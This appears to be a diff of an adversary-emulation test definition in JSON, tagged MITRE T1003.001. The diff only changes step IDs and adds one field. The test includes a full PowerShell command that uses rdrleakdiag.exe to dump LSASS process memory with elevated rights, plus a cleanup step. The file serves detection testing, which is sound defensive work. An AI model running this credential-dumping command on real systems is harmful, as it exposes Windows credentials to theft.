@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "327e1068-4a52-4610-a449-88ffdaf11b8d",
+      "id": "f5d28f56-901d-4c65-8f81-9d5341df3f09",
       "type": "execute-command",
       "data": {
         "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n\u0026 $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "0ff07242-e557-4cf8-9a95-2df25e292d8d",
+      "id": "e2a865f7-98b7-433f-8f67-d4a3d30eefd7",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore",
@@ -27,18 +27,19 @@
   ],
   "flows": [
     {
-      "s": "327e1068-4a52-4610-a449-88ffdaf11b8d",
+      "s": "f5d28f56-901d-4c65-8f81-9d5341df3f09",
       "p": "on-success",
-      "o": "0ff07242-e557-4cf8-9a95-2df25e292d8d"
+      "o": "e2a865f7-98b7-433f-8f67-d4a3d30eefd7"
     },
     {
-      "s": "327e1068-4a52-4610-a449-88ffdaf11b8d",
+      "s": "f5d28f56-901d-4c65-8f81-9d5341df3f09",
       "p": "on-failure",
-      "o": "0ff07242-e557-4cf8-9a95-2df25e292d8d"
+      "o": "e2a865f7-98b7-433f-8f67-d4a3d30eefd7"
     }
   ],
   "tags": [
     "T1003",
     "T1003.001"
-  ]
+  ],
+  "input_arguments": null
 }
